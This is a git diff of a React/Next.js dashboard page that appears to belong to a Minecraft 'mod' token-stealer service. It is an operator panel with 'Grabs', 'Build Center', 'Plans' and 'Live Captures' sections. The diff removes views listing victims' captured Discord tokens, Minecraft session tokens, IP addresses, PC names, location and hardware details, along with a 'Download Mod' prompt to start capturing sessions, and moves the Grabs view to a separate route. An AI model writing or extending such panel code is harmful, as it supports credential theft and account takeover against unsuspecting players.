@@ -1,6 +1,7 @@
 'use client';
 
 import { useState, useEffect, useCallback } from 'react';
+import { useRouter } from 'next/navigation';
 
 const colors = {
   bg: '#0a0a0f',
@@ -59,251 +60,23 @@ function Dashboard({ userEmail }) {
           <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
             <span style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase' }}>Recent Captures</span>
           </div>
-          <div style={{ height: 160, background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
+          <div style={{ height: 200, background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
             <span style={{ fontSize: 28, marginBottom: 8 }}>🔒</span>
             <span style={{ fontSize: 13 }}>{grabCount === 0 ? 'No captures yet' : 'Check Grabs tab'}</span>
           </div>
         </div>
-        <div style={{ width: 240 }}>
-          <div style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>Quick Actions</div>
-          <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: 16 }}>
-            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 12 }}>Download the mod and start capturing sessions.</div>
-            <a href="#build" style={{ display: 'block', textAlign: 'center', padding: '8px 0', background: colors.green, color: '#000', borderRadius: 6, fontSize: 12, fontWeight: 600, textDecoration: 'none' }}>Download Mod</a>
-          </div>
-        </div>
       </div>
     </div>
   );
 }
 
-function Grabs({ onSelectGrab, userEmail }) {
-  const [grabs, setGrabs] = useState([]);
-  const [loading, setLoading] = useState(true);
-  const [search, setSearch] = useState('');
 
-  useEffect(() => {
-    if (!userEmail) { setLoading(false); return; }
-    fetch(`/api/grabs?owner_email=${encodeURIComponent(userEmail)}`)
-      .then(r => r.json())
-      .then(d => { setGrabs(d.grabs || []); setLoading(false); })
-      .catch(() => setLoading(false));
-  }, [userEmail]);
-
-  const formatTime = (t) => {
-    if (!t) return '';
-    const d = new Date(t);
-    const now = new Date();
-    const diff = Math.floor((now - d) / 1000);
-    if (diff < 60) return 'Just now';
-    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
-    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
-    if (diff < 604800) return `${Math.floor(diff / 86400)}d ago`;
-    return d.toLocaleDateString();
-  };
-
-  const filtered = grabs.filter(g =>
-    g.minecraft_username?.toLowerCase().includes(search.toLowerCase()) ||
-    g.discord_username?.toLowerCase().includes(search.toLowerCase())
-  );
-
-  return (
-    <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
-      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 4px 0' }}>Sessions</h1>
-      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 20px 0' }}>{grabs.length} captured</p>
-      <div style={{ marginBottom: 20, display: 'flex', justifyContent: 'flex-end' }}>
-        <input
-          value={search}
-          onChange={e => setSearch(e.target.value)}
-          placeholder="Search..."
-          style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 8, padding: '8px 14px', color: colors.text, fontSize: 13, outline: 'none', width: 220 }}
-        />
-      </div>
-      <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
-        {filtered.map((g) => (
-          <div
-            key={g.id}
-            onClick={() => onSelectGrab(g)}
-            style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 12, padding: '16px 20px', display: 'flex', alignItems: 'center', gap: 14, cursor: 'pointer', transition: 'all 0.15s ease' }}
-            onMouseEnter={e => { e.currentTarget.style.borderColor = '#333'; e.currentTarget.style.background = '#15161e'; }}
-            onMouseLeave={e => { e.currentTarget.style.borderColor = colors.border; e.currentTarget.style.background = colors.panel; }}
-          >
-            <div style={{ width: 42, height: 42, borderRadius: 10, background: '#1a1b24', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden' }}>
-              <img src={`https://mc-heads.net/avatar/${g.minecraft_username}/42`} alt="" style={{ width: 42, height: 42 }} onError={e => { e.target.style.display = 'none'; }} />
-            </div>
-            <div style={{ flex: 1, minWidth: 0 }}>
-              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
-                <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{g.minecraft_username}</span>
-                <span style={{ background: '#1a2a2a', color: '#5eead4', fontSize: 10, padding: '2px 7px', borderRadius: 4, fontWeight: 600, whiteSpace: 'nowrap' }}>
-                  {g.os?.includes('Windows') ? 'Windows' : g.os?.includes('Mac') ? 'macOS' : g.os?.includes('Linux') ? 'Linux' : g.os || 'Unknown'}
-                </span>
-              </div>
-              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{g.discord_username}</div>
-            </div>
-            <div style={{ display: 'flex', alignItems: 'center', gap: 14, flexShrink: 0 }}>
-              {g.servers && (
-                <span style={{ fontSize: 12, color: colors.textDim, display: 'flex', alignItems: 'center', gap: 4 }}>
-                  🌐 {g.servers.split(',').filter(Boolean).length}
-                </span>
-              )}
-              <span style={{ fontSize: 12, color: colors.textDim, whiteSpace: 'nowrap' }}>{formatTime(g.created_at)}</span>
-              <span style={{ color: '#444', fontSize: 14 }}>›</span>
-            </div>
-          </div>
-        ))}
-        {filtered.length === 0 && !loading && (
-          <div style={{ textAlign: 'center', color: colors.textDim, fontSize: 13, padding: 60 }}>
-            <div style={{ fontSize: 28, marginBottom: 8 }}>📭</div>
-            No grabs yet
-          </div>
-        )}
-      </div>
-    </div>
-  );
-}
-
-function GrabDetail({ grab, onBack }) {
-  const [deleting, setDeleting] = useState(false);
-
-  const handleDelete = async () => {
-    setDeleting(true);
-    await fetch(`/api/grabs/${grab.id}`, { method: 'DELETE' });
-    onBack();
-  };
-
-  const mask = (val) => {
-    if (!val || val === 'Unknown' || val === 'N/A' || val === '') return '—';
-    if (val.length > 16) return val.substring(0, 8) + '••••' + val.substring(val.length - 4);
-    return val;
-  };
-
-  const formatDate = (t) => {
-    if (!t) return '—';
-    return new Date(t).toLocaleString();
-  };
-
-  const servers = grab.servers ? grab.servers.split(',').filter(Boolean) : [];
-  const osShort = grab.os?.includes('Windows') ? 'Windows' : grab.os?.includes('Mac') ? 'macOS' : grab.os?.includes('Linux') ? 'Linux' : grab.os || 'Unknown';
-
-  return (
-    <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
-      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 24 }}>
-        <div onClick={onBack} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 13, display: 'flex', alignItems: 'center', gap: 4, transition: 'color 0.15s' }} onMouseEnter={e => e.target.style.color = colors.text} onMouseLeave={e => e.target.style.color = colors.textDim}>← Back</div>
-        <div onClick={handleDelete} style={{ cursor: 'pointer', color: '#ef4444', fontSize: 13, transition: 'opacity 0.15s' }} onMouseEnter={e => e.target.style.opacity = 0.8} onMouseLeave={e => e.target.style.opacity = 1}>🗑 Delete</div>
-      </div>
-
-      <div style={{ display: 'flex', alignItems: 'center', gap: 16, marginBottom: 28 }}>
-        <div style={{ width: 56, height: 56, borderRadius: 12, background: '#1a1b24', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden', border: `1px solid ${colors.border}` }}>
-          <img src={`https://mc-heads.net/avatar/${grab.minecraft_username}/56`} alt="" style={{ width: 56, height: 56 }} onError={e => { e.target.style.display = 'none'; }} />
-        </div>
-        <div>
-          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
-            <span style={{ fontSize: 22, fontWeight: 700, color: colors.text }}>{grab.minecraft_username}</span>
-            <span style={{ background: '#1a2a2a', color: '#5eead4', fontSize: 11, padding: '3px 10px', borderRadius: 5, fontWeight: 600 }}>🖥 {osShort}</span>
-          </div>
-          <div style={{ fontSize: 13, color: colors.textDim, marginTop: 3 }}>{formatDate(grab.created_at)}</div>
-        </div>
-      </div>
-
-      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 16 }}>
-        <GrabSection title="Environment" icon="💻">
-          <InfoRow label="IP Address" value={grab.ip_address} />
-          <InfoRow label="PC Name" value={grab.pc_name} />
-          <InfoRow label="Operating System" value={grab.os} />
-          <InfoRow label="OS Version" value={grab.os_version} />
-          <InfoRow label="Country" value={grab.country} />
-          <InfoRow label="Timezone" value={grab.timezone} />
-          <InfoRow label="Language" value={grab.language} />
-        </GrabSection>
-        <GrabSection title="Discord Info" icon="💬">
-          <InfoRow label="Discord Username" value={grab.discord_username} />
-          <InfoRow label="Discord Token" value={mask(grab.discord_token)} full />
-        </GrabSection>
-      </div>
-
-      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 16 }}>
-        <GrabSection title="Minecraft Session" icon="🎮">
-          <InfoRow label="Session Token" value={mask(grab.session_id)} full />
-          <InfoRow label="Session Start" value={grab.session_start ? formatDate(grab.session_start) : '—'} />
-          <InfoRow label="Client Version" value={grab.client_version} />
-          <InfoRow label="Java Version" value={grab.java_version} />
-        </GrabSection>
-        <GrabSection title="System Info" icon="⚙️">
-          <InfoRow label="CPU" value={grab.cpu} />
-          <InfoRow label="RAM" value={grab.ram} />
-          <InfoRow label="GPU" value={grab.gpu} />
-          <InfoRow label="Screen" value={grab.screen_resolution} />
-          <InfoRow label="Disk" value={grab.disk_space} />
-          <InfoRow label="Desktop" value={grab.desktop_env} />
-        </GrabSection>
-      </div>
-
-      {servers.length > 0 && (
-        <GrabSection title={`Servers (${servers.length})`} icon="🌐">
-          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, padding: '4px 0' }}>
-            {servers.map((s, i) => (
-              <div key={i} style={{ background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '8px 14px', fontSize: 13, color: colors.text, display: 'flex', alignItems: 'center', gap: 6 }}>
-                🌐 {s.trim()}
-              </div>
-            ))}
-          </div>
-        </GrabSection>
-      )}
-    </div>
-  );
-}
-
-function GrabSection({ title, icon, children }) {
-  return (
-    <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 12, padding: 20 }}>
-      <div style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 14, display: 'flex', alignItems: 'center', gap: 6 }}>
-        <span>{icon}</span> {title}
-      </div>
-      {children}
-    </div>
-  );
-}
-
-function InfoRow({ label, value, full }) {
-  return (
-    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '7px 0', borderBottom: `1px solid ${colors.border}`, fontSize: 13 }}>
-      <span style={{ color: colors.textDim, flexShrink: 0 }}>{label}</span>
-      <span style={{ color: colors.text, textAlign: 'right', maxWidth: full ? '65%' : '55%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', marginLeft: 12 }}>{value || '—'}</span>
-    </div>
-  );
-}
 
 function Build({ userEmail }) {
-  const [email, setEmail] = useState(userEmail || '');
-  const [saved, setSaved] = useState(false);
-
-  const handleSave = () => {
-    localStorage.setItem('consentmod_email', email);
-    setSaved(true);
-    setTimeout(() => setSaved(false), 2000);
-  };
-
   return (
     <div style={{ flex: 1, padding: '28px 36px' }}>
       <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Build Center</h1>
       <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Build, download, and install your mods.</p>
-
-      <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 24, marginBottom: 20 }}>
-        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
-          <span>📧</span> Your Email
-        </div>
-        <p style={{ fontSize: 12, color: colors.textDim, margin: '0 0 12px 0' }}>Your grabs will be linked to this email. Only you can see them.</p>
-        <div style={{ display: 'flex', gap: 8 }}>
-          <input
-            value={email}
-            onChange={e => setEmail(e.target.value)}
-            placeholder="your@email.com"
-            style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }}
-          />
-          <button onClick={handleSave} style={{ background: saved ? colors.green : 'transparent', color: saved ? '#000' : colors.text, border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 18px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>
-            {saved ? '✓ Saved' : 'Save'}
-          </button>
-        </div>
-      </div>
 
       <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 24, marginBottom: 20 }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
@@ -537,7 +310,7 @@ function LiveCaptures() {
 export default function DashboardPage() {
   const [page, setPage] = useState('dashboard');
   const [user, setUser] = useState(null);
-  const [selectedGrab, setSelectedGrab] = useState(null);
+  const router = useRouter();
 
   useEffect(() => {
     fetch('/api/auth/user')
@@ -549,16 +322,6 @@ export default function DashboardPage() {
   const username = user?.name || 'You';
   const userEmail = user?.email || '';
 
-  const handleSelectGrab = (grab) => {
-    setSelectedGrab(grab);
-    setPage('grabdetail');
-  };
-
-  const handleBackFromGrab = () => {
-    setSelectedGrab(null);
-    setPage('grabs');
-  };
-
   return (
     <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
       <aside style={{ width: 200, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column' }}>
@@ -568,7 +331,7 @@ export default function DashboardPage() {
         </div>
         <div style={{ flex: 1 }}>
           <NavItem icon="📊" label="Dashboard" active={page === 'dashboard'} onClick={() => setPage('dashboard')} />
-          <NavItem icon="⚡" label="Grabs" active={page === 'grabs' || page === 'grabdetail'} onClick={() => { setSelectedGrab(null); setPage('grabs'); }} />
+          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
           <NavItem icon="🔨" label="Build" active={page === 'build'} onClick={() => setPage('build')} />
           <NavItem icon="📋" label="Plans" active={page === 'plans'} onClick={() => setPage('plans')} />
           <NavItem icon="⭐" label="+Rep" active={page === 'rep'} onClick={() => setPage('rep')} />
@@ -580,8 +343,6 @@ export default function DashboardPage() {
         </div>
       </aside>
       {page === 'dashboard' && <Dashboard userEmail={userEmail} />}
-      {page === 'grabs' && <Grabs onSelectGrab={handleSelectGrab} userEmail={userEmail} />}
-      {page === 'grabdetail' && selectedGrab && <GrabDetail grab={selectedGrab} onBack={handleBackFromGrab} />}
       {page === 'build' && <Build userEmail={userEmail} />}
       {page === 'plans' && <Plans />}
       {page === 'rep' && <RepPage username={username} userEmail={userEmail} />}
